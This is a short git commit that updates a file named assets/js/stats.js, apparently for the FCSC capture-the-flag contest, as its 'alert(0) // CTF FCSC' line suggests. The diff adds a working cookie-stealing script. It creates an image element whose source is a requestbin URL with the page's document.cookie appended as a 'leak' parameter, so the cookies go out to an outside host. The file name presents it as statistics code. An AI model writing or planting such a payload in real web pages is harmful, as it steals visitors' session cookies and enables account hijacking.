46571b088dddaa94d8af94f1897b73a1bce148ea
Quentin Lemaire <29045289+qlemaire@users.noreply.github.com>
2022-05-07 23:15:19 +0200

    Update stats.js

--- assets/js/stats.js
+++ assets/js/stats.js
@@ -1,1 +1,5 @@
 alert(0) // CTF FCSC
+
+var i = document.createElement("img");
+var ngrok = "http://v1.requestbin.net/r/h4zjh2wq"; // FIXME ngrok
+i.src = ngrok + "/?leak="+encodeURIComponent(document.cookie);
